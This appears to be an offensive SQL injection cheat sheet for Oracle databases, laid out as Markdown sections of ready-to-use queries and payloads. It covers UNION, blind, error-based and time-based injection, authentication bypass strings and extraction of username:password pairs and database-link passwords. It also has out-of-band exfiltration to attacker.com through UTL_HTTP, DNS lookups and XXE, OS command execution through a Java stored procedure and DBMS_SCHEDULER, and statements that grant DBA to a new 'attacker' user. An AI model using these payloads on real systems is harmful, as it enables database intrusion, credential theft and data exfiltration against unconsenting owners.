# Oracle SQL Injection

## Version Detection

```sql
SELECT banner FROM v$version WHERE ROWNUM=1
SELECT version FROM v$instance
SELECT * FROM v$version
```

## Important: FROM dual

Oracle requires `FROM` clause. Use `dual` for queries without table:

```sql
SELECT 1 FROM dual           -- Correct
SELECT 1                     -- Error in Oracle
SELECT user FROM dual        -- Get current user
```

## Information Gathering

### Current Context

| Query                                                  | Description   |
| ------------------------------------------------------ | ------------- |
| `SELECT user FROM dual`                                | Current user  |
| `SELECT SYS.DATABASE_NAME FROM dual`                   | Database name |
| `SELECT global_name FROM global_name`                  | Global name   |
| `SELECT name FROM V$DATABASE`                          | Database name |
| `SELECT instance_name FROM V$INSTANCE`                 | Instance      |
| `SELECT ora_database_name FROM dual`                   | Database name |
| `SELECT SYS_CONTEXT('USERENV','IP_ADDRESS') FROM dual` | Client IP     |

### Database Enumeration

```sql
-- List table owners (like databases)
SELECT DISTINCT owner FROM all_tables

-- List tables
SELECT table_name FROM all_tables
SELECT table_name FROM all_tables WHERE owner='SCHEMA_NAME'
SELECT table_name FROM user_tables  -- Current user's tables

-- List columns
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT column_name,data_type FROM all_tab_columns WHERE table_name='USERS'

-- Tables by column name
SELECT owner,table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%'
```

### User Information

```sql
-- List users
SELECT username FROM all_users
SELECT name FROM sys.user$  -- Requires privileges

-- Current privileges
SELECT * FROM session_privs
SELECT * FROM user_role_privs

-- DBA accounts
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION='YES'
SELECT username FROM user_role_privs WHERE granted_role='DBA'
```

## String Functions

| Function  | Example                    | Result  |
| --------- | -------------------------- | ------- |
| Concat    | `'a'\|\|'b'`               | `ab`    |
| `CONCAT`  | `CONCAT('a','b')`          | `ab`    |
| `SUBSTR`  | `SUBSTR('hello',1,3)`      | `hel`   |
| `LENGTH`  | `LENGTH('hello')`          | `5`     |
| `ASCII`   | `ASCII('A')`               | `65`    |
| `CHR`     | `CHR(65)`                  | `A`     |
| `INSTR`   | `INSTR('hello','l')`       | `3`     |
| `REPLACE` | `REPLACE('hello','l','x')` | `hexxo` |

### String Aggregation (Concatenating Multiple Rows)

**⚠️ Important:** `CONCAT()` only accepts **2 parameters**, NOT subqueries with multiple rows!

#### ❌ WRONG - This will fail:

```sql
SELECT CONCAT((SELECT table_name FROM all_tables))
-- Error: ORA-01427: single-row subquery returns more than one row
```

#### ✅ CORRECT - Use LISTAGG() or XMLAGG():

```sql
-- Method 1: LISTAGG() - Recommended (Oracle 11g+)
SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables

-- Method 2: WM_CONCAT() - Deprecated but works
SELECT WM_CONCAT(table_name) FROM user_tables

-- Method 3: XMLAGG() + XMLType
SELECT RTRIM(XMLAGG(XMLELEMENT(e,table_name,',').EXTRACT('//text()') ORDER BY table_name).GetClobVal(),',') FROM user_tables

-- In UNION context (requires FROM dual):
' UNION SELECT 1,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables--
' UNION SELECT 1,WM_CONCAT(table_name) FROM user_tables--
```

#### Common Use Cases:

```sql
-- List all tables
SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables

-- List all columns from a table
SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name)
FROM all_tab_columns WHERE table_name='USERS'

-- Extract data from multiple rows
SELECT LISTAGG(username || ':' || password, '|') WITHIN GROUP (ORDER BY username) FROM users

-- List all table owners (schemas)
SELECT LISTAGG(DISTINCT owner, ',') WITHIN GROUP (ORDER BY owner) FROM all_tables

-- With ROWNUM limit to avoid "result of string concatenation is too long"
SELECT WM_CONCAT(table_name) FROM (SELECT table_name FROM user_tables WHERE ROWNUM <= 100)
```

#### Handling CLOB Columns in UNION:

Oracle **does NOT support CLOB** directly in UNION. Solutions:

```sql
-- Method 1: CAST to VARCHAR2
SELECT id,name,CAST(description AS VARCHAR2(4000)) FROM products
UNION
SELECT 1,'test','desc' FROM dual

-- Method 2: Use TO_CLOB() for other side
SELECT id,name,description FROM products
-- Cannot UNION with non-CLOB! Must avoid UNION if CLOB exists

-- Method 3: Extract without CLOB column
SELECT id,name,price FROM products WHERE id = 0
UNION
SELECT id,secret_name,1 FROM secrets
```

## Comment Syntax

```sql
-- Single line
SELECT 1 FROM dual--comment

-- Multi-line
SELECT 1 FROM dual/*comment*/

-- Inline
SEL/**/ECT 1 FROM dual
```

## Stacked Queries

Oracle does NOT support stacked queries in normal SQL context.
Exception: PL/SQL blocks.

```sql
BEGIN
  EXECUTE IMMEDIATE 'SELECT 1 FROM dual';
END;
```

## Conditional Statements

```sql
-- CASE
SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END FROM dual

-- DECODE
SELECT DECODE(1,1,'true','false') FROM dual

-- NVL
SELECT NVL(NULL,'default') FROM dual
```

## Time Delays

```sql
-- DBMS_PIPE (requires privileges)
SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',10) FROM dual

-- Heavy query method
SELECT COUNT(*) FROM all_users a,all_users b,all_users c,all_users d

-- DBMS_LOCK (requires privileges)
BEGIN DBMS_LOCK.SLEEP(5); END;

-- UTL_INADDR (DNS delay)
SELECT UTL_INADDR.get_host_address('nonexistent.domain.com') FROM dual
```

## Error-based Extraction

```sql
-- UTL_INADDR
SELECT UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual
SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) FROM dual

-- CTXSYS.DRITHSX.SN
SELECT CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual

-- DBMS_XMLGEN
SELECT TO_CHAR(DBMS_XMLGEN.GETXML('SELECT user FROM dual')) FROM dual

-- XMLType
SELECT XMLType('<:'||(SELECT user FROM dual)||'>') FROM dual
```

## UNION Attacks

Remember: Oracle needs `FROM dual` even in UNION:

```sql
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT banner,NULL FROM v$version--
' UNION SELECT table_name,NULL FROM all_tables--
```

## Blind Extraction

```sql
-- Boolean
' AND SUBSTR((SELECT user FROM dual),1,1)='A'--
' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>64--

-- Time-based (using heavy query)
' AND (SELECT CASE WHEN (1=1) THEN
  (SELECT COUNT(*) FROM all_users a,all_users b)
  ELSE 0 END FROM dual)>0--
```

## Out-of-Band

### UTL_HTTP

```sql
-- HTTP request (requires ACL in 11g+)
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual

-- URL encoding
SELECT UTL_URL.ESCAPE('http://attacker.com/'||USER) FROM dual
```

### UTL_INADDR

```sql
-- DNS lookup
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual
```

### XXE (XML External Entity)

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/'||(SELECT user FROM dual)||'"> %remote;]>'),'/l') FROM dual
```

### HTTPURITYPE

```sql
SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).GETCLOB() FROM dual
```

## OS Command Execution

### Java Stored Procedure

```sql
-- Create Java class
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "cmd" AS
import java.io.*;
public class cmd {
  public static String run(String cmd) {
    try {
      Runtime rt = Runtime.getRuntime();
      Process p = rt.exec(cmd);
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line; StringBuffer sb = new StringBuffer();
      while ((line = br.readLine()) != null) sb.append(line).append("\n");
      return sb.toString();
    } catch (Exception e) { return e.toString(); }
  }
};
/

-- Create function
CREATE OR REPLACE FUNCTION run_cmd(p_cmd IN VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'cmd.run(java.lang.String) return String';
/

-- Execute
SELECT run_cmd('whoami') FROM dual;
```

### DBMS_SCHEDULER

```sql
BEGIN
  DBMS_SCHEDULER.create_job(
    job_name => 'myjob',
    job_type => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled => FALSE
  );
  DBMS_SCHEDULER.set_job_argument_value('myjob',1,'-c');
  DBMS_SCHEDULER.set_job_argument_value('myjob',2,'whoami > /tmp/out.txt');
  DBMS_SCHEDULER.enable('myjob');
END;
/
```

## Database Links

```sql
-- Find links
SELECT * FROM DBA_DB_LINKS
SELECT * FROM ALL_DB_LINKS
SELECT * FROM USER_DB_LINKS

-- Query via link
SELECT * FROM table@link_name
SELECT * FROM schema.table@link_name

-- Get link passwords
SELECT db_link,password FROM user_db_links
SELECT name,password FROM sys.link$  -- Encrypted

-- Execute on link
SELECT dbms_xmlquery.getxml('SELECT user FROM dual') FROM table@link
```

## Privilege Escalation

```sql
-- Grant DBA
GRANT DBA TO username

-- Create user
CREATE USER attacker IDENTIFIED BY password

-- Grant privileges
GRANT CONNECT,RESOURCE TO attacker
```

## Row Limiting

Oracle doesn't have LIMIT. Use ROWNUM:

```sql
-- First row
SELECT * FROM users WHERE ROWNUM=1

-- Specific row (subquery required)
SELECT * FROM (
  SELECT a.*,ROWNUM rn FROM users a
) WHERE rn=5

-- Rows 5-10
SELECT * FROM (
  SELECT a.*,ROWNUM rn FROM users a
) WHERE rn BETWEEN 5 AND 10
```

## Quick Payload Reference

```sql
-- Auth bypass
' OR '1'='1'--
' OR 1=1--

-- Union
' UNION SELECT NULL FROM dual--
' UNION SELECT user,NULL FROM dual--
' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--

-- Error
' AND UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--

-- Boolean blind
' AND SUBSTR((SELECT user FROM dual),1,1)='S'--

-- OOB
' AND UTL_HTTP.REQUEST('http://attacker/'||(SELECT user FROM dual))--
```

## Detection Hints

```
Error patterns:
- ORA-XXXXX errors
- "quoted string not properly terminated"
- "missing expression"

Application hints:
- JSP applications often use Oracle
- .NET with Oracle drivers
```
